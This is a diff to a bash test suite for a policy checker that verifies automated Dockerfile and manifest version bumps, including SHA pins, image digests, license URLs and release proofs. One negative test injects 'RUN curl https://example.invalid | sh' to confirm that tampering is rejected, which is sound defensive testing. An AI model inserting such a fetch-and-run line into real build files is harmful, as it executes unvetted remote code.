@@ -947,6 +947,51 @@ NEW_UPSTREAM=abcdef1bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
 	for token in 1234567a a1234567 pin1234567 1234567_extra; do
 		assert_routine not "commit partial token $token" "$commit_filter | .contents.Dockerfile.base = \"$(b64 "ARG DEP=$token")\" | .contents.Dockerfile.head = \"$(b64 "ARG DEP=${token/1234567/abcdef1}")\"" 'pinned file changes beyond version substitution'
 	done
+	BASE_MANIFEST=$(jq -c --arg sha "$OLD_UPSTREAM" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$BASE_MANIFEST")
+	HEAD_MANIFEST=$(jq -c --arg sha "$NEW_UPSTREAM" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$HEAD_MANIFEST")
+	BASE_DOCKERFILE="ARG COMMIT=$OLD_UPSTREAM"
+	HEAD_DOCKERFILE="ARG COMMIT=$NEW_UPSTREAM"
+	assert_routine routine 'commit full SHA pin' "$commit_filter | $(manifest_head "${HEAD_MANIFEST/"$NEW_UPSTREAM"/"$OLD_UPSTREAM"}")"
+	assert_routine not 'commit license URL change is outside the signed policy' "$commit_filter" 'manifest changes beyond'
+	# Coincident keys: full old SHA in the Dockerfile may become the short new version.
+	collision_base=$(jq -c --arg sha "$OLD_UPSTREAM" '.upstreamVersion = $sha' <<<"$BASE_MANIFEST")
+	collision_head=$(jq -c --arg sha "$OLD_UPSTREAM" '.upstreamVersion = "abcdef1" | .upstreamLicense.url |= sub("[0-9a-f]{40}"; $sha)' <<<"$HEAD_MANIFEST")
+	collision_filter="del(.files[4]) | $commit_filter | $(manifest_base "$collision_base") | $(manifest_head "$collision_head")"
+	assert_routine routine 'commit full-to-abbreviated pin' "$collision_filter | $(dockerfile_head "ARG COMMIT=abcdef1")"
+	assert_routine routine 'commit full-to-full pin with coincident keys' "$collision_filter"
+	assert_routine not 'commit coincident keys wrong pin' "$collision_filter | $(dockerfile_head "ARG COMMIT=abcdef2")" 'pinned file changes beyond version substitution'
+	unchanged_license_head="${HEAD_MANIFEST/"$NEW_UPSTREAM"/"$OLD_UPSTREAM"}"
+	assert_routine not 'commit wrong full SHA pin' "$commit_filter | $(manifest_head "$unchanged_license_head") | $(dockerfile_head "ARG COMMIT=${NEW_UPSTREAM}0")" 'pinned file changes beyond version substitution'
+	assert_routine not 'commit wrong license URL' "$commit_filter | $(manifest_head "${HEAD_MANIFEST/"$NEW_UPSTREAM"/"${NEW_UPSTREAM}0"}")" 'manifest changes beyond'
+	assert_routine not 'commit license metadata changed' "$commit_filter | $(manifest_head "${unchanged_license_head/MIT/Apache}")" 'manifest changes beyond'
+)
+# GH#38364: semver policies may opt in to proven release-commit and image-digest pins.
+(
+	OLD_C=1111111111111111111111111111111111111111
+	NEW_C=2222222222222222222222222222222222222222
+	D_OLD="sha256:$(printf 'a%.0s' {1..64})"
+	D_NEW="sha256:$(printf 'b%.0s' {1..64})"
+	D_BAD="sha256:$(printf 'c%.0s' {1..64})"
+	POLICY_JSON=$(jq -c '. + {upstream_repository:"upstream/project",release_identity:{commit_arg:"APP_COMMIT",images_json_asset:"images.json"}}' <<<"$POLICY_JSON")
+	BASE_MANIFEST=$(jq -c --arg sha "$OLD_C" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$BASE_MANIFEST")
+	HEAD_MANIFEST=$(jq -c --arg sha "$NEW_C" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$HEAD_MANIFEST")
+	BASE_DOCKERFILE=$'FROM ghcr.io/up/svc:v3.39.87@'"${D_OLD}"$'\nARG APP_COMMIT='"${OLD_C}"$'\nARG AIDEVOPS_VERSION=3.39.87\n'
+	HEAD_DOCKERFILE=$'FROM ghcr.io/up/svc:v3.39.114@'"${D_NEW}"$'\nARG APP_COMMIT='"${NEW_C}"$'\nARG AIDEVOPS_VERSION=3.39.114\n'
+	BASE_DOCKERFILE="${BASE_DOCKERFILE//v3.39.87/3.39.87}"
+	HEAD_DOCKERFILE="${HEAD_DOCKERFILE//v3.39.114/3.39.114}"
+	id_filter=".upstream_proof = null | .release_proof = {repository:\"upstream/project\",asset:\"images.json\",old_commit:\"$OLD_C\",new_commit:\"$NEW_C\",status:\"ahead\",merge_base:\"$OLD_C\",digests:[\"$D_NEW\"]}"
+	assert_routine routine 'release identity pins' "$id_filter"
+	assert_routine not 'identity not opted in' "$id_filter | del(.policy.release_identity)" 'manifest changes beyond'
+	assert_routine not 'identity missing proof' "$id_filter | del(.release_proof)" 'release proof repository or asset mismatch'
+	assert_routine not 'identity wrong asset' "$id_filter | .release_proof.asset = \"other.json\"" 'repository or asset mismatch'
+	assert_routine not 'identity not ahead' "$id_filter | .release_proof.status = \"diverged\"" 'strictly ahead'
+	assert_routine not 'identity digest unpublished' "$id_filter | .release_proof.digests = [\"$D_BAD\"]" 'pinned file changes beyond version substitution'
+	assert_routine not 'identity head digest differs' "$id_filter | $(dockerfile_head "${HEAD_DOCKERFILE/"$D_NEW"/"$D_BAD"}")" 'pinned file changes beyond version substitution'
+	assert_routine not 'identity commit unproven' "$id_filter | .release_proof.new_commit = \"${NEW_C//2/3}\" | .release_proof.merge_base = \"$OLD_C\"" 'manifest changes beyond'
+	assert_routine not 'identity license commit unproven' "$id_filter | $(manifest_head "${HEAD_MANIFEST//"$NEW_C"/"${NEW_C//2/3}"}")" 'manifest changes beyond'
+	assert_routine not 'identity license other field' "$id_filter | $(manifest_head "${HEAD_MANIFEST/MIT/Apache}")" 'manifest changes beyond'
+	assert_routine not 'identity extra Dockerfile line' "$id_filter | $(dockerfile_head "${HEAD_DOCKERFILE}"$'RUN curl https://example.invalid | sh\n')" 'pinned file changes beyond version substitution'
+	assert_routine not 'identity digest outside FROM' "$id_filter | $(dockerfile_head "${HEAD_DOCKERFILE}"$'ARG X=sha256:'"${D_NEW#sha256:}"$'\n')" 'pinned file changes beyond version substitution'
 )
 # Main-build suffixes cannot borrow tag authority; the documented migration
 # needs one per-release signature before strict-tag routine bumps can start.
@@ -1018,7 +1063,7 @@ assert_routine routine 'Buzz after signed strict-tag migration' "del(.files[3,4]
 			;;
 		'pr view') jq -cn --arg head "$HEAD_SHA" '{closingIssuesReferences: [{number: 30}], headRefOid: $head}' ;;
 		'api repos/owner/app/issues/30')
-			if [[ "${POLICY_MODE:-semver}" == commits ]]; then
+			if [[ "${POLICY_MODE:-semver}" == commits || "$POLICY_CASE" == mode_mismatch ]]; then
 				jq -cn --arg sha "$NEW_UPSTREAM" --arg scenario "$POLICY_CASE" '{state:"open",author_association:"OWNER",
 				 body:("Finding\n<!-- aidevops:cloudron-package-monitor upstream-commit-" + $sha + " -->\nUpstream `" + (if $scenario == "commit_wrong_repo" then "other/project" else "upstream/project" end) + "` branch `main` head is `" + $sha + "` (date): update")}'
 			else
@@ -1089,6 +1134,8 @@ assert_routine routine 'Buzz after signed strict-tag migration' "del(.files[3,4]
 	assert_policy verified 0
 	# The compare base is the resolved main SHA, never the bare branch name.
 	grep -q "^gh api repos/owner/app/compare/${MAIN_SHA}\.\.\.${HEAD_SHA}\$" "${TEST_ROOT}/calls"
+	assert_policy mode_mismatch 1
+	grep -q 'standing policy #50 does not apply (policy mode semver vs finding upstream-commit-' "${TEST_ROOT}/policy-err"
 	assert_policy docker_tamper 1
 	grep -q 'pinned file changes beyond version substitution' "${TEST_ROOT}/policy-err"
 	assert_policy check_tamper 1
